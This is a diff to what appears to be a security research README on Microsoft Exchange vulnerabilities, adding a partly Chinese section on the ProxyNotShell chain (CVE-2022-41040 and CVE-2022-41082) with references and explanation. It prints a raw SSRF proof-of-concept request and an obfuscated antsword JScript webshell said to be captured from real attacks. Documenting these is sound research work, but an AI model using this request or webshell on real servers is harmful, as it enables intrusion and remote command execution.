@@ -32,7 +32,8 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | ProxyRelay (test failed) | [CVE-2021-33768](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768) | July 13, 2021 | Relay to Exchange FrontEnd | yes |
 | ProxyRelay (test failed) | [CVE-2022-21979](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979) | October 11, 2022 | Relay to Exchange BackEnd | yes |
 | ProxyRelay (test failed) | [CVE-2021-26414](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414) | June 8, 2021 | Relay to Exchange DCOM | yes |
-| ProxyNotShell |  |  |  | yes |
+| ProxyNotShell (WIP) | [CVE-2022-41040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41040) | 2022年11月8日 | 服务端请求伪造(SSRF)漏洞 | yes |
+| ProxyNotShell (WIP) | [CVE-2022-41082](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41082) | 2022年11月8日 | 远程执行代码RCE漏洞 | yes |
 | ProxyNotRelay |  |  |  | yes |
 | OWASSRF(CVE-2022-41080) | [CVE-2022-41080]() |  |  | yes |
 | TabShell(CVE-2022-41076) | [CVE-2022-41076]() |  |  | yes |
@@ -611,15 +612,70 @@ DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
 
 
 
-# ProxyNotShell
+# ProxyNotShell (WIP)
 ## ProxyNotShell part links
 
  - [ProxyNotShell — the story of the claimed zero days in Microsoft Exchange](https://doublepulsar.com/proxynotshell-the-story-of-the-claimed-zero-day-in-microsoft-exchange-5c63d963a9e9)
+ - [WARNING: NEW ATTACK CAMPAIGN UTILIZED A NEW 0-DAY RCE VULNERABILITY ON MICROSOFT EXCHANGE SERVER](https://gteltsc.vn/blog/warning-new-attack-campaign-utilized-a-new-0day-rce-vulnerability-on-microsoft-exchange-server-12715.html)
  - [ProxyNotShell: CVE-2022-41040 and CVE-2022-41082 Exploits Explained](https://www.picussecurity.com/resource/blog/proxynotshellcve-2022-41040-and-cve-2022-41082-exploits-explained)
  - [Microsoft Exchange ProxyNotShell vulnerability explained and how to mitigate it](https://www.csoonline.com/article/3682762/microsoft-exchange-proxynotshell-vulnerability-explained-and-how-to-mitigate-it.html)
  - [CONTROL YOUR TYPES OR GET PWNED: REMOTE CODE EXECUTION IN EXCHANGE POWERSHELL BACKEND](https://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend)
  - [Threat Brief: CVE-2022-41040 and CVE-2022-41082: Microsoft Exchange Server (ProxyNotShell)](https://unit42.paloaltonetworks.com/proxynotshell-cve-2022-41040-cve-2022-41082/)
- - [ProxyNotShell-PoC](https://github.com/testanull/ProxyNotShell-PoC)
+ - [Analyzing attacks using the Exchange vulnerabilities CVE-2022-41040 and CVE-2022-41082](https://www.microsoft.com/en-us/security/blog/2022/09/30/analyzing-attacks-using-the-exchange-vulnerabilities-cve-2022-41040-and-cve-2022-41082/)
+ - [All the Proxy(Not)Shells](https://www.splunk.com/en_us/blog/security/all-the-proxy-not-shells.html)
+
+
+| | |
+| ----------- | ----------- |
+| ZDI-CAN-18333 | ZDI-CAN-18802 |
+| CVE-2022-41040 | CVE-2022-41082 |
+
+该漏洞利用链为认证后RCE(需要输入账号密码)
+
+该SSRF攻击请求入口和2021年的ProxyShell漏洞一样
+
+ - CVE-2022-41040 poc
+
+``` bash
+GET /autodiscover/autodiscover.json?@zdi/PowerShell?serializationLevel=Full;ExchClientVer=15.2.922.7;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.17763.592&Email=autodiscover/autodiscover.json%3F@zdi HTTP/1.1
+Host: 192.168.1.10
+Authorization: Basic cG9jdXNlcjpwb2NwYXNzd2QK
+Connection: close
+```
+
+成功利用CVE-2022-41040漏洞后，能向任意后端服务发送带有LocalSystem权限的URI和数据的请求
+
+ProxyNotShell链中的第二个漏洞是CVE-2022-41082，这是一个在Exchange PowerShell后端发现的远程代码执行漏洞。它的CVSS得分为8.8(高)。攻击者通过滥用CVE-2022-41040绕过身份验证后，利用CVE-2022-41082在易受攻击的Exchange服务器上运行任意命令。
+
+这些被攻击的Exchange服务器的版本号显示已经安装了最新的更新，因此利用之前proxyshell的Proxyshell后端的漏洞是不可能的，所以可以确认这是一个新的0day RCE漏洞利用链
+
+此外，给出的修复手段与2021年的ProxyShell Powershell RCE完全相同
+
+由于利用CVE-2022-41040和CVE-2022-41082攻击者利用和ProxyShell漏洞的相同SSRF->RCE攻击流程，但需要对Exchange服务器进行身份验证，所以Kevin Beaumont将此漏洞链命名为ProxyNotShell，以其前身命名。
+
+ - 实际攻击捕获到的antsword webshell
+
+``` bash
+<%@Page Language="Jscript"%>
+<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('NTcyM'+'jk3O3'+'ZhciB'+'zYWZl'+''+'P'+'S'+char(837-763)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('MQ=='))+char(51450/525)+''+''+char(0640-0462)+char(0x8c28/0x1cc)+char(0212100/01250)+System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String('Wg=='))+'m'+''+'UiO2V'+'2YWwo'+'UmVxd'+'WVzdC'+'5JdGV'+'tWydF'+'WjBXS'+'WFtRG'+'Z6bU8'+'xajhk'+'J10sI'+'HNhZm'+'UpOzE'+'3MTY4'+'OTE7'+'')));%>
+```
+
+ProxyShell漏洞的利用只发生在端口443上(HTTPS)，而ProxyNotShell端口5985(HTTP)和5986(HTTPS)也在利用范围内
+
+ - [Janggggg's github 公开 ProxyNotShell PoC](https://github.com/testanull/ProxyNotShell-PoC)
+
+ - [poc利用证明](https://twitter.com/wdormann/status/1593311129874403335?s=20&t=VlkAC7azYSOHl9MF4bOc3g)
+
+11月17日，[ZeroSteiner](https://github.com/zeroSteiner)向MetaSploit分享了一个[pull请求](https://github.com/rapid7/metasploit-framework/pull/17275)，该请求提供了一种常见的方法来利用该漏洞，并且还提供了一个绕过[Exchange紧急缓解(EM)服务](https://learn.microsoft.com/en-us/exchange/exchange-emergency-mitigation-service?view=exchserver-2019)的方法，或微软推荐的IIS URL重写。此外，PR中还有对ProxyShell漏洞的更新。
+
+ - [metasploit Microsoft Exchange ProxyNotShell RCE](https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxynotshell_rce/)
+
+
+
+
+
+
+
 
 
 
